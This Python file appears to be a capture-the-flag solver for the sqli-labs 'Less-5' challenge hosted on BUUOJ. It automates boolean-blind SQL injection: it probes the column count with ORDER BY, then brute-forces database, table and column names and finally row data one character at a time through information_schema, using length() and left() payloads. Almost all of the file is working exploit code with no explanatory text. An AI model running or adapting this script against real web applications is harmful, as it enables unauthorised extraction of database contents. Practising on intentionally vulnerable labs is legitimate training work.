import requests as req
from time import sleep
from utils.standardHeaders import standardHeader
from utils.normal import sqlForce

baseurl = 'http://23d65079-79df-4e5a-add3-55879b10730e.node4.buuoj.cn:81/Less-5/?id=1'
delayBetweenRequests = 1


def get(url, header=standardHeader):
    res = req.get(url, headers=header)
    sleep(delayBetweenRequests)
    return res

def checkRes(res, okText):
    if okText in res:
        return True
    else:
        return False


def confirmPosition(pocUrl, okText):
    print("Checking the columns of API result")
    checkUrl = pocUrl + " order by "
    for i in range(1, 100):
        res = get(checkUrl + str(i) + " -- -")
        if not checkRes(res.text, okText):
            return i-1


def forceDatabases(pocUrl, okText):
    payload = "(select group_concat(schema_name) from information_schema.schemata)"
    s = " union select 1,2,{} limit 1,1 -- -"
    print("Forcing database length")
    for databaseConcatLength in range(50,9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(databaseConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("Database length is {}\nForcing each char".format(databaseConcatLength))
            allDatabases = ''
            payload = "and left(" + payload + ",{})='{}' -- -"
            for index in range(1,databaseConcatLength+1):
                for char in sqlForce:
                    nowDatabases = allDatabases + char
                    expUrl = pocUrl + payload.format(str(index), nowDatabases)
                    res = get(expUrl)
                    if checkRes(res.text, okText):
                        allDatabases = nowDatabases
                        print(allDatabases)
                        break
            return allDatabases


def forceTables(pocUrl, database, okText):
    payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
    s = " union select 1,2,{} limit 1,1 -- -"
    print("Forcing all tables' length")
    for tableConcatLength in range(1, 9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(tableConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("table length is {}\nForcing each char".format(tableConcatLength))
            allTables = ''
            payload = "and left(" + payload + ",{})='{}' -- -"
            for index in range(1, tableConcatLength+1):
                for char in sqlForce:
                    nowTables = allTables + char
                    expUrl = pocUrl + payload.format(str(index), nowTables)
                    res = get(expUrl)
                    if checkRes(res.text, okText):
                        allTables = nowTables
                        print(allTables)
                        break
            return allTables


def forceColumns(pocUrl, table, okText):
    payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
    print("Forcing all columns' length")
    for columnConcatLength in range(1, 9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(columnConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("columns length is {}\nForcing each char".format(columnConcatLength))
            allColumns = ''
            payload = "and left(" + payload + ",{})='{}' -- -"
            for index in range(1, columnConcatLength+1):
                for char in sqlForce:
                    nowColumns = allColumns + char
                    expUrl = pocUrl + payload.format(str(index), nowColumns)
                    res = get(expUrl)
                    if checkRes(res.text, okText):
                        allColumns = nowColumns
                        print(allColumns)
                        break
            return allColumns


def dumpData(pocUrl, okText, database, table, column='*'):
    payload = "(select {} from {}.{})".format(column, database, table)
    print("Forcing all data's length")
    for dataConcatLength in range(1, 9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(dataConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("data length is {}\nForcing each char".format(dataConcatLength))
            allData = ''
            payload = "and left(" + payload + ",{})='{}' -- -"
            for index in range(1, dataConcatLength+1):
                for char in sqlForce:
                    nowData = allData + char
                    expUrl = pocUrl + payload.format(str(index), nowData)
                    # print(expUrl)
                    res = get(expUrl)
                    if checkRes(res.text, okText):
                        allData = nowData
                        print(allData)
                        break
            return allData


if __name__ == '__main__':
    okText = 'You are in'
    res = get(baseurl)
    positionCount = confirmPosition(baseurl+'\'', okText)
    print('There are {} positions'.format(positionCount))
    position = ''
    for i in range(1, positionCount):
        position = position + str(i) + ','
    databases = forceDatabases(baseurl+'\'', okText)
    print('Input a database to force all tables:')
    database = input()
    tables = forceTables(baseurl+'\'', database, okText)
    print('Input a table to force all columns:')
    table = input()
    columns = forceColumns(baseurl+'\'', table, okText)
    print('Input a column to force all data:')
    dumpColumn = input()
    columns = dumpData(baseurl + '\'', okText, database='ctftraining', table='flag', column=dumpColumn)

